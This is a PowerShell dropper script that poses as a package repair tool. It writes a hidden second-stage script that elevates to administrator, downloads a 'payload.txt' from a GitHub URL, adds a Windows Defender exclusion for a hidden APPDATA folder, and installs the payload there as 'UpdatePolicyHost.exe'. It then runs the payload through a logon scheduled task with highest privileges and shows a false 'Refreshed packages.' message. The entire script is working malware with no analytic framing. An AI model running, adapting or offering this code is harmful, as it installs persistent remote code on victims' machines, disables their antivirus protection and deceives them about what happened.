$content=@'
If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{
    Start-Process powershell "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -WindowStyle Hidden -Verb RunAs
    exit
}

$dummy_name_no_exe = "UpdatePolicyHost"
$hidden_path = $env:APPDATA + "\$dummy_name_no_exe"
$dummy_name = "$dummy_name_no_exe.exe"
#$cwd_path = Split-Path -Path $PSCommandPath -Parent -Resolve

if (!(Test-Path "$hidden_path")){
    mkdir "$hidden_path"
}
else{
    if (Test-Path "$hidden_path\$dummy_name") {
        Write-Output "[19882] EXISTS ERROR!"
        Write-Output "[Press enter to exit]"
        pause
        exit
    }
}

Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerPizza/Wireless-ALT-F4-public/master/payload.txt" -OutFile "$env:USERPROFILE\payload.txt"

if ((Get-MpPreference).ExclusionPath -contains "$hidden_path") {
    Remove-MpPreference -ExclusionPath "$hidden_path"
}
Add-MpPreference -ExclusionPath "$hidden_path"

Copy-Item "$env:USERPROFILE\payload.txt" -Destination "$hidden_path\$dummy_name"
schtasks /create /tn "$dummy_name_no_exe" /tr "$hidden_path\$dummy_name" /sc onlogon /rl HIGHEST /f
Remove-Item "$env:USERPROFILE\payload.txt"
schtasks /run /tn "$dummy_name_no_exe"

New-Item "$env:TEMP\repair_complete.flag" -ItemType File -Force
Set-Content "$env:TEMP\repair_complete.flag" "SUCCESS"

Add-Type -AssemblyName PresentationFramework

[System.Windows.MessageBox]::Show(
    "Refreshed packages.",
    "Done"
)
'@

$temp_script_path = "$env:TEMP\launchx.ps1"
New-Item "$temp_script_path" -ItemType File -Force
Set-Content "$temp_script_path" "$content"

Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$temp_script_path`"" -WindowStyle Hidden